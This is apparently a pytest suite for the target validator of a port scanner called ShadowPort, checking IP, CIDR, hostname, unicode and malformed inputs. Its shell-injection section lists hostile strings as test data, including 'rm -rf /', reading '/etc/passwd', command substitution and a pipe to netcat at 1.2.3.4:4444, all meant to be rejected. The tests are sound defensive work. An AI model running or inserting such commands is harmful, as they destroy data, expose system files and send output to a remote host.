"""
tests/test_validation.py — ShadowPort Scanner v2.1.0
Full validation test suite covering every input category.
"""

import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

import pytest
from scanner import validate_target


# ─── Valid inputs ─────────────────────────────────────────────────────────────

@pytest.mark.parametrize("target", [
    "192.168.1.1",
    "10.0.0.1",
    "172.16.0.1",
    "0.0.0.0",
    "255.255.255.255",
    "192.168.1.0/24",
    "10.0.0.0/8",
    "0.0.0.0/0",
    "192.168.1.1/32",
    "scanme.nmap.org",
    "google.com",
    "sub.domain.co.uk",
    "test.example.org",
])
def test_valid_targets(target):
    r = validate_target(target)
    assert r.valid, f"Expected {target!r} valid — got: {r.reason}"


# ─── Invalid inputs ───────────────────────────────────────────────────────────

@pytest.mark.parametrize("target", [
    "",                     # empty
    " ",                    # whitespace only
    "1",                    # single digit
    "2",
    "3",
    "abc",                  # single word
    "hello world",          # spaces
    "999.999.999.999",      # octets out of range
    "192.168",              # incomplete IP
    "192.168.1",            # incomplete IP
    "256.0.0.1",            # bad octet
    "300.1.1.1",
    "@@@@",                 # garbage
    "@",
    "192.168.1.0/33",       # invalid CIDR prefix
    "192.168.1.0/99",
    "999.0.0.0/24",         # bad CIDR IP part
])
def test_invalid_targets(target):
    r = validate_target(target)
    assert not r.valid, f"Expected {target!r} INVALID but it passed"
    assert r.reason, "Expected a rejection reason"


# ─── Shell injection attempts ─────────────────────────────────────────────────

@pytest.mark.parametrize("target", [
    "; rm -rf /",
    "192.168.1.1; ls",
    "| cat /etc/passwd",
    "`whoami`",
    "$(id)",
    "192.168.1.1 && reboot",
    "host.com | nc 1.2.3.4 4444",
    "1.1.1.1\nrm -rf /",
    "target\r\n",
])
def test_shell_injection_rejected(target):
    r = validate_target(target)
    assert not r.valid, f"Shell injection {target!r} should be rejected"


# ─── Unicode input ────────────────────────────────────────────────────────────

@pytest.mark.parametrize("target", [
    "héllo.com",
    "192.168.1.١",
    "目标.com",
    "тест.рф",
])
def test_unicode_rejected(target):
    r = validate_target(target)
    assert not r.valid, f"Unicode target {target!r} should be rejected"


# ─── CIDR edge cases ─────────────────────────────────────────────────────────

def test_cidr_slash_zero():
    assert validate_target("0.0.0.0/0").valid

def test_cidr_slash_32():
    assert validate_target("192.168.1.1/32").valid

def test_cidr_bad_ip_rejects():
    assert not validate_target("999.0.0.0/24").valid

def test_cidr_prefix_33_rejects():
    assert not validate_target("192.168.1.0/33").valid


# ─── ValidationResult fields ─────────────────────────────────────────────────

def test_valid_result_has_no_reason():
    r = validate_target("192.168.1.1")
    assert r.valid
    assert r.reason == ""

def test_invalid_result_has_reason():
    r = validate_target("garbage")
    assert not r.valid
    assert len(r.reason) > 0
